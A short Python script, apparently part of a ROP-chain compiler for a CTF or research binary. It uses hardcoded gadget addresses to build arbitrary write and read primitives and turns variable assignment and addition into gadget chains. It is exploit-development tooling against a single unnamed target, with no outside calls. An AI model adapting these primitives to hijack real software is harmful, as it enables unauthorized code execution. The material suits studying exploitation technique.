#!/usr/bin/env python3

from exploiter import exploiter

ea_data = 0x00000000006C1060
exp = exploiter()

derefer_rax_rax = 0x000000000048fcf0 # mov rax, qword ptr [rax] ; add rsp, 8 ; ret


def rax_equ(val):
    exp.add_gadet(0x000000000044db34) # pop rax ; ret
    exp.add_gadet(val)


def rsi_equ(val):
    exp.add_gadet(0x0000000000401c87) # pop rsi ; ret
    exp.add_gadet(val)


def qword_convert(ea_start, position):
    return ea_start + position * 8


def write_what_where(ea, value):
    global exp

    rsi_equ(ea)             
    rax_equ(value)

    exp.add_gadet(0x0000000000470f11)


def write_what_where_RAX(ea):
    global exp

    rsi_equ(ea)             

    exp.add_gadet(0x0000000000470f11)


def read_toRAX(ea):
    global derefer_rax_rax

    rax_equ(ea)
    exp.add_gadet(derefer_rax_rax)
    # Add padding for add rsp
    exp.add_gadet(0x0000000000000000)


def finalize():
    global exp
    
    exp.finish()


class PRE_ASSIGNMENT:
    def __init__(self, addr, value) -> None:
        write_what_where(addr, value)


# TODO: Refactor
class ADDITION:
    def __init__(self, pre, lvar_name, rvar_name) -> None:
        l_addr, r_addr = pre.variable_address(lvar_name), pre.variable_address(rvar_name)

        read_toRAX(l_addr)
        write_what_where_RAX(pre.LVAR)
        read_toRAX(r_addr)
        write_what_where_RAX(pre.RVAR)
